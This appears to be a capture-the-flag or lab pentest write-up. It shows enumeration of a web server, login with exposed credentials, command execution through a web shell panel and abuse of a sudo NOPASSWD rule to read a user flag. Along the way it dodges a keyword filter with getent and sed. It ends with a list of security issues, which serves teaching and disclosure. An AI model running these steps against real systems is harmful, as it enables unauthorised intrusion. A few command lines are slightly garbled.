# H4ck3rz – Pentest Report - Web Enumeration, Authenticated RCE and Local Privilege Escalation

## 1. Target Enumeration

Target:

```bash
10.10.0.48
```

An initial Nmap scan was performed:

```bash
sudo nmap -sV -sC -oA exegol1 10.10.0.48
```

Parameters:

* `-sV`: detects services and their versions.
* `-sC`: runs Nmap default NSE scripts.
* `-oA exegol1`: saves the scan results in `.nmap`, `.gnmap` and `.xml` formats.

The scan identified two exposed TCP services:

```bash
22/tcp open  ssh   OpenSSH 10.0p2 Debian
80/tcp open  http  Apache/2.4.68 (Debian)
```

Nmap also detected a `robots.txt` file containing a disallowed path:

```bash
/1337_53CR37_l41r
```

A full TCP port scan was then performed:

```bash
sudo nmap -p- -T4 -oA exegol1-allports 10.10.0.48
```

Only ports `22` and `80` were open.

## 2. Web Enumeration

The `robots.txt` file was retrieved:

```bash
curl -i http://10.10.0.48/robots.txt
```

Result:

```bash
HTTP/1.1 200 OK

User-agent: *
Disallow: /1337_53CR37_l41r
```

The disclosed directory was then accessed:

```bash
curl -i http://10.10.0.48/1337_53CR37_l41r/
+
curl http://10.10.0.48
```

Credentials discovered during enumeration:

```bash
Username: d4rk_T1t0u4N
Password: 8ES7_SHeLL_Ev4H
```

An SSH authentication attempt was made with these credentials, but they were not valid for SSH.

## 3. Directory and File Discovery

Gobuster was used to discover additional Web resources:

```bash
gobuster dir -u http://10.10.0.48/ -w ~/work/Pentest/Wordlist/SecLists/Discovery/Web-Content/common.txt
+
gobuster dir -u http://10.10.0.48/1337_53CR37_l41r -w ~/work/Pentest/Wordlist/SecLists/Discovery/Web-Content/common.txt
+
gobuster dir -u http://10.10.0.48 -w ~/work/Pentest/Wordlist/SecLists/Discovery/Web-Content/common.txt -x php,txt,html,bak,zip
```

Parameters:

* `dir`: directory/file enumeration mode.
* `-u`: target URL.
* `-w`: wordlist.
* `-x`: additional file extensions to test.

Results:

```bash
/assets       Status: 301
/index.html   Status: 200
/login.php    Status: 200
/portal.php   Status: 302 -> /login.php
/robots.txt   Status: 200
```

`login.php` and `portal.php` revealed an authentication portal.

## 4. Web Authentication

The login page was inspected:

```bash
curl -i http://10.10.0.48/login.php
```

The HTML form used the following POST parameters:

```html
<input name="username">
<input name="password">
<input name="sub">
```

The previously discovered credentials were therefore tested against the Web login:

```bash
curl -i -c cookies.txt -d 'username=d4rk_T1t0u4N&password=8ES7_SHeLL_Ev4H&sub=Login'http://10.10.0.48/login.php
```

Parameters:

* `-i`: includes the HTTP response headers.
* `-c cookies.txt`: stores the session cookie.
* `-d`: sends POST form data.

The server returned:

```bash
HTTP/1.1 302 Found
Location: /portal.php
```

This confirmed successful authentication.

The authenticated session was then reused:

```bash
curl -i -b cookies.txt http://10.10.0.48/portal.php | `-b cookies.txt`: sends the stored cookie.
```

The server returned:

```bash
HTTP/1.1 200 OK
```

The portal contained a **Shell Panel** allowing commands to be submitted.

## 5. Remote Command Execution

The Shell Panel accepted a POST parameter named `command`.

Command execution was tested with:

```bash
curl -b cookies.txt --data-urlencode 'command=id' --data-urlencode 'sub=Execute' http://10.10.0.48/portal.php
```

Result:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed remote command execution as the Apache account:

```bash
www-data
```

The current working directory was also identified:

```bash
/var/www/html
```

## 6. Local Enumeration

The Web directory was enumerated:

```bash
ls -la /var/www/html
```

Results :

```bash
1337_53CR37_l41r/
assets/
forbidden.php
index.html
login.php
portal.php
robots.txt
```

System users were enumerated with get entries + users account because 'cat /etc/passwd'  was filtered.

```bash
getent passwd
```

A normal local user was identified:

```bash
titouan:x:1000:1000::/home/titouan:/bin/bash
```

SUID binaries were also enumerated:

```bash
find / -perm -4000 -type f 2>/dev/null
```

No immediately unusual SUID binary was identified during this step.

## 7. Sudo Misconfiguration

The sudo permissions available to `www-data` were checked:

```bash
sudo -l
```

Result:

```bash
User www-data may run the following commands on h4xx0r_pc:

    (titouan) NOPASSWD: ALL
```

This is a privilege escalation misconfiguration.

It means that `www-data` can execute **any command as the user `titouan` without providing a password**.

The access was verified with:

```bash
sudo -u titouan id
```

Result:

```bash
uid=1000(titouan) gid=1000(titouan) groups=1000(titouan)
```

The contents of the user's home directory were then enumerated:

```bash
sudo -u titouan ls -la /home/titouan
```

Results :

```bash
-rwsrwsrwt 1 root    root    1298416 42sh
-r-------- 1 titouan titouan      30 user.txt
```

The `user.txt` file was readable only by `titouan`.

## 8. User Flag

An initial attempt to read the file using `cat` was blocked by the Web application's command filter.

Another legitimate file-reading utility was therefore used:

```bash
sudo -u titouan sed -n '1p' /home/titouan/user.txt
```

Parameters:

* `sudo -u titouan`: executes the command as `titouan`.
* `sed -n '1p'`: prints the first line of the file.

Flag :

```bash
EPI{71me_70_D0_7H05E_NcuR5e2}
```

## Attack Path Summary

```text
Nmap enumeration
        ↓
HTTP service discovered
        ↓
robots.txt disclosure
        ↓
Hidden directory discovered
        ↓
Password exposed
        ↓
HTML source disclosure
        ↓
Username exposed
        ↓
Gobuster enumeration
        ↓
login.php / portal.php
        ↓
Valid Web authentication
        ↓
Authenticated command execution
        ↓
www-data
        ↓
sudo misconfiguration
(titouan) NOPASSWD: ALL
        ↓
titouan
        ↓
/home/titouan/user.txt
        ↓
User flag retrieved
```

## Main Security Issues Identified

1. Sensitive path disclosed through `robots.txt`.
2. Password stored in publicly accessible HTML.
3. Username exposed in an HTML comment.
4. Authenticated Web interface allowing operating-system command execution.
5. Excessive sudo privileges allowing `www-data` to execute arbitrary commands as `titouan` without authentication.
6. Weak command filtering based on forbidden keywords rather than preventing command execution entirely.
